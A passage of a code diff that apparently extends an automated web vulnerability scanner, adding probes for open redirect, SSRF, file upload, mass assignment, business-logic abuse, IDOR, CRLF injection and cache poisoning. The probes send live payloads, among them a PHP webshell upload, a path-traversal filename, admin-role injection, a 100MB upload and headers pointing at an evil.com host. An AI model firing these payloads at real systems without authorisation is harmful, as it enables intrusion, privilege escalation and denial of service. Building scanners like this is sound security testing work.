   const EXTERNAL_TEST_DOMAIN = "https://attacker-vulnscan.evil.com";
 
@@ -2309,15 +2949,15 @@ async function probeActiveOpenRedirect(html: string, baseUrl: string): Promise<P
   for (const match of matches) {
     try {
       const baseUrlObj = new URL(match[1], baseUrl);
-      
+
       // Test each redirect parameter
       for (const param of REDIRECT_PARAMS) {
         if (!baseUrlObj.toString().includes(param)) continue;
-        
+
         try {
           const testUrl = new URL(baseUrlObj.toString());
           testUrl.searchParams.set(param, EXTERNAL_TEST_DOMAIN);
-          
+
           const resp = await fetch(testUrl.toString(), {
             method: "GET",
             headers: FETCH_HEADERS,
@@ -2328,7 +2968,7 @@ async function probeActiveOpenRedirect(html: string, baseUrl: string): Promise<P
           }).catch(() => null);
 
           if (!resp) continue;
-          
+
           // Check Location header for the external domain
           const location = resp.headers.get("location") || "";
           if (location.includes("attacker-vulnscan.evil.com") || location === EXTERNAL_TEST_DOMAIN) {
@@ -2345,6 +2985,39 @@ async function probeActiveOpenRedirect(html: string, baseUrl: string): Promise<P
         } catch { /* next param */ }
       }
     } catch { /* skip malformed URL */ }
+  }
+
+  // Also test discovered param URLs that have redirect-like parameter names
+  for (const crawledUrl of paramUrls.slice(0, 10)) {
+    try {
+      const crawledParsed = new URL(crawledUrl);
+      for (const key of crawledParsed.searchParams.keys()) {
+        if (!REDIRECT_PARAMS.some(p => key.toLowerCase().includes(p))) continue;
+        const testUrl = new URL(crawledParsed.toString());
+        testUrl.searchParams.set(key, EXTERNAL_TEST_DOMAIN);
+        const resp = await fetch(testUrl.toString(), {
+          method: "GET",
+          headers: FETCH_HEADERS,
+          redirect: "manual",
+          signal: AbortSignal.timeout(5000),
+          // @ts-ignore
+          next: { revalidate: 0 },
+        }).catch(() => null);
+        if (!resp) continue;
+        const location = resp.headers.get("location") || "";
+        if (location.includes("attacker-vulnscan.evil.com")) {
+          return {
+            type: "open-redirect-active",
+            severity: "MEDIUM",
+            url: testUrl.toString(),
+            parameter: key,
+            evidence: `Active Open Redirect confirmed via crawler-discovered parameter "${key}". The application redirects to the external domain "${EXTERNAL_TEST_DOMAIN}" (Location: ${location}).`,
+            cvssScore: 6.1,
+            cveId: "CWE-601",
+          };
+        }
+      }
+    } catch { /* skip */ }
   }
   return null;
 }
@@ -2399,11 +3072,24 @@ async function probeSoftwareCompositionAnalysis(baseUrl: string): Promise<Pendin
           };
 
           for (const [name, versionStr] of Object.entries(allDeps)) {
-            const version = String(versionStr).replace(/^[~^=]/, "").split(".")[0];
-            if (COMMON_VULN_PACKAGES[name] && version) {
+            // semver: correct version comparison — "10.0.0" > "4.17.11" is now properly true
+            // The old string comparison had: "10" < "4.17.11" === true (wrong!)
+            const cleanVersion = String(versionStr).replace(/^[~^>=<]/, "");
+            if (COMMON_VULN_PACKAGES[name] && cleanVersion) {
               const vuln = COMMON_VULN_PACKAGES[name];
-              // Simple version comparison (not perfect, but good for detection)
-              if (vuln.affectedVersions.some((v) => version < v.replace("<", ""))) {
+              const isVulnerable = vuln.affectedVersions.some((constraint) => {
+                try {
+                  // constraint format: "<4.17.11" → threshold "4.17.11"
+                  const threshold = constraint.replace(/^[<>]=?/, "");
+                  const op = constraint.startsWith("<=") ? "lte" :
+                             constraint.startsWith("<") ? "lt" :
+                             constraint.startsWith(">=") ? "gte" : "gt";
+                  const coerced = semver.coerce(cleanVersion);
+                  if (!coerced) return false;
+                  return semver[op](coerced, threshold);
+                } catch { return false; }
+              });
+              if (isVulnerable) {
                 findings.push({
                   type: "vulnerable-dependency",
                   severity: "HIGH",
@@ -2487,14 +3173,27 @@ async function probeBlindSSRFWithTiming(paramUrl: string): Promise<PendingFindin
           }).catch(() => null);
           const elapsed = Date.now() - start;
 
-          // Timing-based SSRF detection: significant delay indicates connection attempt
-          if (resp && elapsed > baselineTime + 2000) {
+          // FP-FIX #5: Timing-based SSRF detection: 3s threshold with 3-attempt confirmation
+          if (resp && elapsed > baselineTime + 3000) {
+            // Verify with 2 more measurements to eliminate network jitter
+            let hitCount = 1;
+            for (let i = 0; i < 2; i++) {
+              const start2 = Date.now();
+              await fetch(testUrl.toString(), {
+                headers: FETCH_HEADERS,
+                signal: AbortSignal.timeout(8000),
+                // @ts-ignore
+                next: { revalidate: 0 },
+              }).catch(() => null);
+              if ((Date.now() - start2) > baselineTime + 3000) hitCount++;
+            }
+            if (hitCount < 2) continue; // Not reproducible — likely network jitter
             return {
               type: "blind-ssrf-timing",
               severity: "HIGH",
               url: testUrl.toString(),
               parameter: param,
-              evidence: `Blind Server-Side Request Forgery (SSRF) detected via timing analysis. Request to local/internal URL "${payload}" took ${elapsed}ms vs baseline ${baselineTime}ms. The application fetches URLs from user input without validation, allowing attackers to scan internal networks, access metadata services, or pivot to internal services.`,
+              evidence: `Blind Server-Side Request Forgery (SSRF) detected via timing analysis (${hitCount}/3 attempts delayed). Request to local/internal URL "${payload}" took ${elapsed}ms vs baseline ${baselineTime}ms. The application fetches URLs from user input without validation, allowing attackers to scan internal networks, access metadata services, or pivot to internal services.`,
               cvssScore: 8.6,
               cveId: "CWE-918",
             };
@@ -2507,15 +3206,1078 @@ async function probeBlindSSRFWithTiming(paramUrl: string): Promise<PendingFindin
 }
 
 // ══════════════════════════════════════════════════════════════════════════════
+// GAP FIX #6: FILE UPLOAD VULNERABILITIES (CWE-434 / OWASP A03:2021)
+// ══════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Probes for file upload vulnerabilities by testing common upload endpoints
+ * with malicious file types and oversized files.
+ * Tests for: unrestricted file types, missing size limits, path traversal in uploads
+ */
+async function probeFileUploadVulnerabilities(baseUrl: string, html: string): Promise<PendingFinding[]> {
+  const findings: PendingFinding[] = [];
+
+  // Extract upload form endpoints
+  const uploadForms: Array<{ action: string; fieldName: string }> = [];
+  for (const formMatch of html.matchAll(/<form[^>]*>([\s\S]*?)<\/form>/gi)) {
+    const formBody = formMatch[1] || "";
+    const fullForm = formMatch[0];
+
+    // Check for file input fields
+    const fileInputMatch = formBody.match(/<input[^>]+type=["']?file["']?[^>]*name=["']([^"']+)["']/i);
+    if (fileInputMatch) {
+      const actionMatch = fullForm.match(/action=["']([^"']+)["']/i);
+      const actionUrl = actionMatch ? new URL(actionMatch[1], baseUrl).toString() : baseUrl;
+      uploadForms.push({ action: actionUrl, fieldName: fileInputMatch[1] });
+    }
+  }
+
+  // Also probe common upload API endpoints (expanded for better discovery)
+  const uploadApiPaths = [
+    "/api/upload", "/api/v1/upload", "/api/v2/upload", "/api/uploads", "/upload",
+    "/api/file/upload", "/api/files/upload", "/rest/file/upload", "/file/upload",
+    "/files/upload", "/upload/file", "/api/images/upload", "/api/media/upload",
+    "/upload/image", "/upload/document", "/upload/file", "/api/v1/file/upload",
+  ];
+
+  for (const path of uploadApiPaths) {
+    try {
+      const url = new URL(path, baseUrl).toString();
+      const resp = await safeFetch(url, 5000);
+      if (resp && (resp.status === 200 || resp.status === 405)) {
+        const text = await resp.text().catch(() => "");
+        if (!isSpaHtmlFallback(resp, text)) {
+          uploadForms.push({ action: url, fieldName: "file" });
+        }
+      }
+    } catch { /* skip */ }
+  }
+
+  if (uploadForms.length === 0) return findings;
+
+  // Test each upload endpoint
+  for (const { action, fieldName } of uploadForms.slice(0, 3)) {
+    try {
+      // Test 1: Executable file upload (webshell)
+      const webshellContent = "<?php system($_GET['cmd']); ?>";
+      const webshellFormData = new FormData();
+      webshellFormData.append(fieldName, new Blob([webshellContent], { type: "application/x-php" }), "shell.php");
+
+      const webshellResp = await fetch(action, {
+        method: "POST",
+        body: webshellFormData,
+        signal: AbortSignal.timeout(6000),
+        // @ts-ignore
+        next: { revalidate: 0 },
+      }).catch(() => null);
+
+      if (webshellResp && webshellResp.ok) {
+        const text = await webshellResp.text().catch(() => "");
+        if (!isSpaHtmlFallback(webshellResp, text)) {
+          findings.push({
+            type: "file-upload-executable",
+            severity: "CRITICAL",
+            url: action,
+            parameter: fieldName,
+            evidence: `File upload endpoint ${action} accepts executable PHP files without validation. An attacker can upload webshells to achieve Remote Code Execution on the server.`,
+            cvssScore: 9.8,
+            cveId: "CWE-434",
+          });
+        }
+      }
+
+      // Test 2: Oversized file (DoS via large upload)
+      const largeFile = new Uint8Array(100 * 1024 * 1024); // 100MB
+      const largeFormData = new FormData();
+      largeFormData.append(fieldName, new Blob([largeFile], { type: "application/octet-stream" }), "large.bin");
+
+      const largeResp = await fetch(action, {
+        method: "POST",
+        body: largeFormData,
+        signal: AbortSignal.timeout(10000),
+        // @ts-ignore
+        next: { revalidate: 0 },
+      }).catch(() => null);
+
+      if (largeResp && largeResp.ok) {
+        const text = await largeResp.text().catch(() => "");
+        if (!isSpaHtmlFallback(largeResp, text)) {
+          findings.push({
+            type: "file-upload-no-size-limit",
+            severity: "HIGH",
+            url: action,
+            parameter: fieldName,
+            evidence: `File upload endpoint ${action} accepts files >100MB without size validation. This enables DoS attacks via storage exhaustion.`,
+            cvssScore: 7.5,
+            cveId: "CWE-770",
+          });
+        }
+      }
+
+      // Test 3: Path traversal in filename
+      const traversalFormData = new FormData();
+      traversalFormData.append(fieldName, new Blob(["test"], { type: "text/plain" }), "../../../etc/passwd");
+
+      const traversalResp = await fetch(action, {
+        method: "POST",
+        body: traversalFormData,
+        signal: AbortSignal.timeout(6000),
+        // @ts-ignore
+        next: { revalidate: 0 },
+      }).catch(() => null);
+
+      if (traversalResp && traversalResp.ok) {
+        const text = await traversalResp.text().catch(() => "");
+        if (!isSpaHtmlFallback(traversalResp, text)) {
+          findings.push({
+            type: "file-upload-path-traversal",
+            severity: "HIGH",
+            url: action,
+            parameter: fieldName,
+            evidence: `File upload endpoint ${action} accepts path traversal sequences in filenames. Attackers may overwrite system files or write to arbitrary locations.`,
+            cvssScore: 8.1,
+            cveId: "CWE-22",
+          });
+        }
+      }
+
+      // Test 4: MIME type spoofing
+      const spoofedFormData = new FormData();
+      spoofedFormData.append(fieldName, new Blob(["<?php system('cmd'); ?>"], { type: "image/jpeg" }), "image.jpg.php");
+
+      const spoofedResp = await fetch(action, {
+        method: "POST",
+        body: spoofedFormData,
+        signal: AbortSignal.timeout(6000),
+        // @ts-ignore
+        next: { revalidate: 0 },
+      }).catch(() => null);
+
+      if (spoofedResp && spoofedResp.ok) {
+        const text = await spoofedResp.text().catch(() => "");
+        if (!isSpaHtmlFallback(spoofedResp, text)) {
+          findings.push({
+            type: "file-upload-mime-spoofing",
+            severity: "HIGH",
+            url: action,
+            parameter: fieldName,
+            evidence: `File upload endpoint ${action} relies on client-provided Content-Type headers without validation. Attackers can upload malicious files disguised as safe types.`,
+            cvssScore: 7.5,
+            cveId: "CWE-434",
+          });
+        }
+      }
+
+    } catch { /* next endpoint */ }
+  }
+
+  return findings;
+}
+
+// ══════════════════════════════════════════════════════════════════════════════
+// GAP FIX #7: MASS ASSIGNMENT / PARAMETER TAMPERING (CWE-915 / OWASP A01:2021)
+// ══════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Probes for mass assignment vulnerabilities by injecting unexpected parameters
+ * into API endpoints (e.g., role: "admin", isAdmin: true).
+ * Tests for: privilege escalation via parameter injection, object mass assignment
+ */
+async function probeMassAssignment(baseUrl: string, jsBundleEndpoints: JsApiEndpoint[], session: AuthSession): Promise<PendingFinding[]> {
+  const findings: PendingFinding[] = [];
+
+  const PRIVILEGE_ESCALATION_PAYLOADS = [
+    { role: "admin" },
+    { isAdmin: true },
+    { admin: true },
+    { role: "administrator" },
+    { permissions: ["admin", "superuser"] },
+    { userType: "admin" },
+  ];
+
+  // Test registration/update endpoints (expanded for better discovery)
+  const sensitiveEndpoints = [
+    "/api/users", "/api/v1/users", "/api/v2/users", "/api/register", "/api/signup",
+    "/rest/user/register", "/api/user/register", "/api/account", "/api/auth/register",
+    "/api/v1/register", "/api/v2/register", "/user/register", "/auth/register",
+    "/users", "/register", "/signup", "/create-account", "/join",
+  ];
+
+  for (const path of sensitiveEndpoints) {
+    try {
+      const url = new URL(path, baseUrl).toString();
+
+      // First, try a normal registration to understand the expected fields
+      const testEmail = `test_${Date.now()}@vulnscan.internal`;
+      const normalBody = { email: testEmail, password: "TestPassword123!", username: "testuser" };
+
+      const normalResp = await authedFetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(normalBody),
+      }, 6000, false, session);
+
+      if (!normalResp || normalResp.status === 404) continue;
+
+      // Now try with privilege escalation payloads
+      for (const payload of PRIVILEGE_ESCALATION_PAYLOADS) {
+        const escalatedBody = { ...normalBody, ...payload };
+
+        const escalatedResp = await authedFetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(escalatedBody),
+        }, 6000, false, session);
+
+        if (escalatedResp && (escalatedResp.status === 200 || escalatedResp.status === 201)) {
+          const text = await escalatedResp.text().catch(() => "");
+          try {
+            const json = JSON.parse(text);
+            const key = Object.keys(payload)[0];
+            const val = payload[key as keyof typeof payload];
+
+            const isEscalated =
+              json[key] === val ||
+              (key === "role" && (json.role === "admin" || json.role === "administrator")) ||
+              (key === "isAdmin" && json.isAdmin === true) ||
+              (key === "admin" && json.admin === true);
+
+            if (isEscalated) {
+              findings.push({
+                type: "mass-assignment-privilege-escalation",
+                severity: "CRITICAL",
+                url,
+                parameter: key,
+                evidence: `Mass Assignment vulnerability confirmed. Injecting parameter "${key}: ${val}" during registration modified the account role in JSON response.`,
+                cvssScore: 9.8,
+                cveId: "CWE-915",
+                isVerified: true,
+                confidence: CONFIDENCE.EXEC_VERIFIED,
+              });
+              break;
+            }
+          } catch { /* not valid JSON response */ }
+        }
+      }
+    } catch { /* next endpoint */ }
+  }
+
+  // Test JS-discovered endpoints for mass assignment
+  for (const endpoint of jsBundleEndpoints) {
+    if (endpoint.path.includes("user") || endpoint.path.includes("profile") || endpoint.path.includes("account")) {
+      try {
+        const url = new URL(endpoint.path, baseUrl).toString();
+
+        for (const payload of PRIVILEGE_ESCALATION_PAYLOADS) {
+          const body: Record<string, any> = {};
+          for (const field of endpoint.fields) {
+            body[field] = field === "email" ? `test_${Date.now()}@vulnscan.internal` : "test";
+          }
+          Object.assign(body, payload);
+
+          const resp = await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(body),
+            signal: AbortSignal.timeout(6000),
+            // @ts-ignore
+            next: { revalidate: 0 },
+          }).catch(() => null);
+
+          if (resp && (resp.status === 200 || resp.status === 201)) {
+            const text = await resp.text().catch(() => "");
+            try {
+              const json = JSON.parse(text);
+              const key = Object.keys(payload)[0];
+              const val = payload[key as keyof typeof payload];
+
+              if (json[key] === val || json.role === "admin" || json.isAdmin === true) {
+                findings.push({
+                  type: "mass-assignment",
+                  severity: "HIGH",
+                  url,
+                  parameter: key,
+                  evidence: `Mass Assignment vulnerability detected at ${url}. Parameter "${key}" was merged into user object.`,
+                  cvssScore: 8.5,
+                  cveId: "CWE-915",
+                  isVerified: true,
+                  confidence: CONFIDENCE.DUAL_VERIFIED,
+                });
+                break;
+              }
+            } catch { /* not valid JSON */ }
+          }
+        }
+      } catch { /* next endpoint */ }
+    }
+  }
+
+  return findings;
+}
+
+// ══════════════════════════════════════════════════════════════════════════════
+// GAP FIX #8: BUSINESS LOGIC VULNERABILITIES (CWE-840 / OWASP A01:2021)
+// ══════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Probes for business logic vulnerabilities including:
+ * - Price manipulation
+ * - Coupon/promo code abuse
+ * - Feedback/review tampering
+ * - Basket manipulation
+ */
+async function probeBusinessLogicVulnerabilities(baseUrl: string, session: AuthSession): Promise<PendingFinding[]> {
+  const findings: PendingFinding[] = [];
+
+  // Helper to verify that response is a genuine successful JSON API response (not an error JSON or HTML SPA fallback)
+  const isSuccessfulJsonResponse = async (resp: Response | null): Promise<any | null> => {
+    if (!resp || (resp.status !== 200 && resp.status !== 201)) return null;
+    const contentType = (resp.headers.get("content-type") || "").toLowerCase();
+    const text = await resp.text().catch(() => "");
+    if (isSpaHtmlFallback(resp, text)) return null;
+    if (!contentType.includes("application/json") && !text.trim().startsWith("{") && !text.trim().startsWith("[")) {
+      return null;
+    }
+    try {
+      const json = JSON.parse(text);
+      if (!json || typeof json !== "object") return null;
+      if (json.status === "error" || json.success === false || json.error) return null;
+      const msg = String(json.message || json.detail || json.error || "").toLowerCase();
+      if (msg.includes("invalid") || msg.includes("not found") || msg.includes("failed") || msg.includes("denied")) return null;
+      return json;
+    } catch {
+      return null;
+    }
+  };
+
+  // Test 1: Negative price manipulation (API endpoints only)
+  const priceEndpoints = [
+    "/api/basket", "/api/cart", "/api/orders", "/rest/basket", "/api/v1/basket",
+    "/api/v2/basket", "/api/order", "/api/v1/order", "/api/shop/basket", "/api/shop/cart", "/rest/cart", "/rest/order",
+  ];
+  for (const path of priceEndpoints) {
+    try {
+      const url = new URL(path, baseUrl).toString();
+      const negativePriceBody = { productId: 1, quantity: 1, price: -100, total: -100 };
+
+      const resp = await authedFetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(negativePriceBody),
+      }, 6000, false, session);
+
+      const json = await isSuccessfulJsonResponse(resp);
+      if (json && (json.price === -100 || json.total === -100 || json.status === "success" || json.id)) {
+        findings.push({
+          type: "business-logic-price-manipulation",
+          severity: "CRITICAL",
+          url,
+          parameter: "price",
+          evidence: `Business Logic vulnerability: Negative price manipulation confirmed. The endpoint accepted a negative price value (-100) and returned a successful JSON order response.`,
+          cvssScore: 9.1,
+          cveId: "CWE-840",
+          isVerified: true,
+          confidence: CONFIDENCE.EXEC_VERIFIED,
+        });
+        break;
+      }
+    } catch { /* next endpoint */ }
+  }
+
+  // Test 2: Coupon manipulation (API endpoints only)
+  const couponEndpoints = [
+    "/api/coupon", "/api/coupons", "/api/apply-coupon", "/rest/coupon",
+    "/api/v1/coupon", "/api/v2/coupon", "/api/discount", "/api/promo", "/api/promotion",
+  ];
+  for (const path of couponEndpoints) {
+    try {
+      const url = new URL(path, baseUrl).toString();
+      const couponPayloads = [
+        { code: "ADMIN100", discount: 100 },
+        { code: "FREE", discount: 100 },
+        { code: "UNLIMITED", discount: 999 },
+      ];
+
+      for (const payload of couponPayloads) {
+        const resp = await authedFetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+        }, 6000, false, session);
+
+        const json = await isSuccessfulJsonResponse(resp);
+        if (json && (json.discount === payload.discount || json.code === payload.code || json.applied === true)) {
+          findings.push({
+            type: "business-logic-coupon-abuse",
+            severity: "HIGH",
+            url,
+            parameter: "code",
+            evidence: `Business Logic vulnerability: Coupon manipulation confirmed. The endpoint accepted coupon code "${payload.code}" and returned discount application response.`,
+            cvssScore: 7.5,
+            cveId: "CWE-840",
+            isVerified: true,
+            confidence: CONFIDENCE.DUAL_VERIFIED,
+          });
+          break;
+        }
+      }
+    } catch { /* next endpoint */ }
+  }
+
+  // Test 3: Feedback/review manipulation (API endpoints only)
+  const feedbackEndpoints = [
+    "/api/feedback", "/api/reviews", "/api/review", "/rest/feedback",
+    "/api/v1/feedback", "/api/v2/feedback", "/api/comment", "/api/comments", "/rest/review",
+  ];
+  for (const path of feedbackEndpoints) {
+    try {
+      const url = new URL(path, baseUrl).toString();
+      const manipulationPayloads = [
+        { rating: 999, comment: "test" },
+        { rating: -1, comment: "test" },
+        { rating: 5, comment: "<script>alert(1)</script>" },
+      ];
+
+      for (const payload of manipulationPayloads) {
+        const resp = await authedFetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+        }, 6000, false, session);
+
+        const json = await isSuccessfulJsonResponse(resp);
+        if (json && (json.rating === payload.rating || json.id || json.status === "success")) {
+          findings.push({
+            type: "business-logic-feedback-manipulation",
+            severity: "MEDIUM",
+            url,
+            parameter: "rating",
+            evidence: `Business Logic vulnerability: Feedback manipulation. The endpoint accepted out-of-bounds rating value (${payload.rating}) without validation.`,
+            cvssScore: 5.3,
+            cveId: "CWE-840",
+            isVerified: true,
+            confidence: CONFIDENCE.DUAL_VERIFIED,
+          });
+          break;
+        }
+      }
+    } catch { /* next endpoint */ }
+  }
+
+  return findings;
+
+}
+
+// ══════════════════════════════════════════════════════════════════════════════
+// GAP FIX #9: PASSWORD POLICY TESTING (CWE-521)
+// ══════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Tests password policy enforcement by attempting to register with weak passwords
+ * and checking if they are accepted.
+ */
+async function probePasswordPolicy(baseUrl: string, session: AuthSession): Promise<PendingFinding | null> {
+  const registerEndpoints = [
+    "/api/register", "/api/signup", "/api/users", "/rest/user/register",
+    "/api/auth/register", "/api/v1/register", "/api/v2/register", "/user/register",
+    "/auth/register", "/register", "/signup", "/users", "/create-account",
+  ];
+
+  const weakPasswords = [
+    "123456",
+    "password",
+    "admin",
+    "test",
+    "qwerty",
+    "12345678",
+    "abc123",
+  ];
+
+  for (const path of registerEndpoints) {
+    try {
+      const url = new URL(path, baseUrl).toString();
+
+      for (const weakPassword of weakPasswords) {
+        const testEmail = `test_${Date.now()}@vulnscan.internal`;
+        const body = {
+          email: testEmail,
+          password: weakPassword,
+          username: "testuser"
+        };
+
+        const resp = await authedFetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(body),
+        }, 6000, false, session);
+
+        if (resp && (resp.status === 200 || resp.status === 201)) {
+          return {
+            type: "weak-password-policy",
+            severity: "MEDIUM",
+            url,
+            parameter: "password",
+            evidence: `Weak password policy detected. Registration endpoint accepted weak password "${weakPassword}" without enforcing complexity requirements. This makes users susceptible to brute-force and dictionary attacks.`,
+            cvssScore: 5.9,
+            cveId: "CWE-521",
+          };
+        }
+      }
+    } catch { /* next endpoint */ }
+  }
+
+  return null;
+}
+
+// ══════════════════════════════════════════════════════════════════════════════
 // GAP FIX #5: MULTI-USER PRIVILEGE ESCALATION / IDOR-BOLA WITH DUAL-TOKEN
 // ══════════════════════════════════════════════════════════════════════════════
 
 /**
- * Testing IDOR / BOLA with dual-tokens removed to prevent false positives.
- * (The original implementation tested without a valid token, which is covered by probeUnauthenticatedAPIAccess).
+ * IDOR / BOLA Testing with Dual-Token cross-account access check.
+ *
+ * Requires TWO sessions (user1 and user2). Fetches a resource using user1's
+ * credentials, then attempts to access the same resource with user2's token.
+ * If user2 gets a 200 with user1's data — confirmed IDOR (OWASP A01 / CWE-639).
  */
-async function probeIDORWithDualToken(baseUrl: string, jsBundleEndpoints: JsApiEndpoint[]): Promise<PendingFinding | null> {
+async function probeIDORWithDualToken(baseUrl: string, jsBundleEndpoints: JsApiEndpoint[], session: AuthSession): Promise<PendingFinding | null> {
+  // We need two distinct authenticated sessions to test BOLA
+  if (!session.bearerToken || !session.bearerToken2) return null;
+  if (!session.userId || String(session.userId).trim().length === 0) return null;
+
+  const targetUserId = String(session.userId).trim();
+
+  // Common patterns for user-specific resource endpoints (explicitly excluding self-me endpoints)
+  const userResourcePaths = [
+    `/api/users/${targetUserId}`,
+    `/api/user/${targetUserId}`,
+    `/api/Users/${targetUserId}`,
+    `/api/account/${targetUserId}`,
+    `/api/profile/${targetUserId}`,
+    `/api/v1/users/${targetUserId}`,
+  ];
+
+  // Also check js-discovered endpoints that contain the user ID
+  const discoveredUserPaths = jsBundleEndpoints
+    .filter(e => e.path.includes(targetUserId) || e.path.includes(":id") || e.path.includes(":userId"))
+    .map(e => e.path.replace(":id", targetUserId).replace(":userId", targetUserId))
+    .filter(p => !p.endsWith("/me") && !p.endsWith("/change-password"))
+    .slice(0, 3);
+
+  const allPaths = [...new Set([...userResourcePaths, ...discoveredUserPaths])];
+
+  for (const path of allPaths) {
+    try {
+      const url = new URL(path, baseUrl).toString();
+
+      // Fetch with User 1's token
+      const resp1 = await fetch(url, {
+        headers: { ...FETCH_HEADERS, Authorization: `Bearer ${session.bearerToken}` },
+        signal: AbortSignal.timeout(6000),
+        // @ts-ignore
+        next: { revalidate: 0 },
+      }).catch(() => null);
+
+      if (!resp1 || resp1.status !== 200) continue;
+      const body1 = await resp1.text().catch(() => "");
+      if (!body1 || body1.length < 20) continue;
+
+      // Access User 1's specific resource URL with User 2's token (cross-account)
+      const resp2 = await fetch(url, {
+        headers: { ...FETCH_HEADERS, Authorization: `Bearer ${session.bearerToken2}` },
+        signal: AbortSignal.timeout(6000),
+        // @ts-ignore
+        next: { revalidate: 0 },
+      }).catch(() => null);
+
+      if (!resp2 || resp2.status !== 200) continue;
+
+      const body2 = await resp2.text().catch(() => "");
+      try {
+        const json2 = JSON.parse(body2);
+        const jsonStr = JSON.stringify(json2);
+
+        // Confirm IDOR: User 2's cross-account response contains User 1's ID in an identifier field
+        // or matches User 1's unique response payload structure
+        const hasExplicitUserKey =
+          jsonStr.includes(`"id":"${targetUserId}"`) ||
+          jsonStr.includes(`"id":${targetUserId}`) ||
+          jsonStr.includes(`"userId":"${targetUserId}"`) ||
+          jsonStr.includes(`"userId":${targetUserId}`) ||
+          jsonStr.includes(`"ownerId":"${targetUserId}"`) ||
+          jsonStr.includes(`"ownerId":${targetUserId}`);
+
+        if (hasExplicitUserKey || (targetUserId.length >= 4 && jsonStr.includes(targetUserId))) {
+          return {
+            type: "idor-bola",
+            severity: "CRITICAL",
+            url,
+            parameter: "Authorization",
+            evidence: `Insecure Direct Object Reference (IDOR/BOLA) confirmed at ${url}. ` +
+              `User 2 successfully accessed resource owned by User 1 (ID: ${targetUserId}) using User 2's bearer token. ` +
+              `The server returned HTTP 200 with User 1's account data, confirming missing object-level authorization.`,
+            cvssScore: 9.1,
+            cveId: "CWE-639",
+            isVerified: true,
+            confidence: CONFIDENCE.DUAL_VERIFIED,
+          };
+        }
+      } catch { /* not json */ }
+    } catch { /* next path */ }
+  }
   return null;
+}
+
+// ══════════════════════════════════════════════════════════════════════════════
+// IMPROVEMENT #1: CRLF INJECTION / HTTP RESPONSE SPLITTING (CWE-113)
+// ══════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Injects CRLF (\r\n) sequences into URL params to test for HTTP header injection.
+ * If the injected header appears in the response, the server is vulnerable to
+ * session fixation, cache poisoning, and XSS via header injection.
+ */
+async function probeCRLFInjection(paramUrl: string): Promise<PendingFinding | null> {
+  const CRLF_PAYLOADS = [
+    { inject: "\r\nInjected-Header: vulnscan-crlf-test", headerName: "injected-header", headerVal: "vulnscan-crlf-test" },
+    { inject: "%0d%0aInjected-Header:%20vulnscan-crlf-test", headerName: "injected-header", headerVal: "vulnscan-crlf-test" },
+    { inject: "%0d%0aSet-Cookie:%20vulnscan=crlfpoc", headerName: "set-cookie", headerVal: "vulnscan=crlfpoc" },
+  ];
+
+  try {
+    const u = new URL(paramUrl);
+    const params = [...u.searchParams.keys()];
+    if (params.length === 0) return null;
+
+    for (const param of params.slice(0, 3)) {
+      const origVal = u.searchParams.get(param) ?? "";
+      for (const { inject, headerName, headerVal } of CRLF_PAYLOADS) {
+        try {
+          const testUrl = new URL(u.toString());
+          testUrl.searchParams.set(param, origVal + inject);
+          const resp = await safeFetch(testUrl.toString(), 5000);
+          if (!resp) continue;
+
+          const injectedValue = resp.headers.get(headerName) ?? "";
+          if (injectedValue.includes(headerVal)) {
+            // Confirm with a second distinct payload
+            const confirmUrl = new URL(u.toString());
+            confirmUrl.searchParams.set(param, origVal + "%0d%0aX-Confirm: vulnscan-confirmed");
+            const confirmResp = await safeFetch(confirmUrl.toString(), 5000);
+            const confirmHeader = confirmResp?.headers.get("x-confirm") ?? "";
+            if (!confirmHeader.includes("vulnscan-confirmed")) continue;
+
+            return {
+              type: "crlf-injection",
+              severity: "HIGH",
+              url: testUrl.toString(),
+              parameter: param,
+              evidence: `CRLF Injection (HTTP Response Splitting) confirmed. Injecting CRLF characters into parameter "${param}" caused the server to emit an injected HTTP header "${headerName}: ${headerVal}". Confirmed with a second payload. Attackers can inject Set-Cookie headers for session fixation, add malicious Location redirects, or inject Content-Type + body for XSS.`,
+              cvssScore: 8.1,
+              cveId: "CWE-113",
+              confidence: CONFIDENCE.DUAL_VERIFIED,
+              validationSteps: [`Payload injected "${headerName}: ${headerVal}" into response headers`, "Second payload (X-Confirm) also appeared in response headers"],
+              isVerified: true,
+            };
+          }
+        } catch { /* next payload */ }
+      }
+    }
+  } catch { /* skip */ }
+  return null;
+}
+
+// ══════════════════════════════════════════════════════════════════════════════
+// IMPROVEMENT #5: WEB CACHE POISONING DETECTION (CWE-349)
+// ══════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Tests for web cache poisoning by injecting X-Forwarded-Host with a unique
+ * cache-buster, then re-requesting cleanly. If the clean response still
+ * contains the injected host, the cache is poisoned.
+ */
+async function probeCachePoisoning(targetUrl: string): Promise<PendingFinding | null> {
+  const EVIL_HOST = "vulnscan-cache-poison-test.evil.com";
+  const cacheBuster = "_vulnscan_cb=" + Date.now().toString(36);
+
+  try {
+    const poisonUrl = targetUrl + (targetUrl.includes("?") ? "&" : "?") + cacheBuster;
+
+    // Step 1: Send a poisoning request
+    const poisonResp = await fetch(poisonUrl, {
+      headers: {
+        ...FETCH_HEADERS,
+        "X-Forwarded-Host": EVIL_HOST,
+        "X-Host": EVIL_HOST,
+        "X-Forwarded-Server": EVIL_HOST,
+      },
+      signal: AbortSignal.timeout(6000),
+      // @ts-ignore
+      next: { revalidate: 0 },
+    }).catch(() => null);
+    if (!poisonResp || poisonResp.status >= 400) return null;
+
+    // Step 2: Wait briefly for cache to store
+    await new Promise(r => setTimeout(r, 500));
+
+    // Step 3: Send a CLEAN request (no evil headers)
+    const cleanResp = await fetch(poisonUrl, {
+      headers: FETCH_HEADERS,
+      signal: AbortSignal.timeout(6000),
+      // @ts-ignore
+      next: { revalidate: 0 },
+    }).catch(() => null);
+    if (!cleanResp) return null;
+
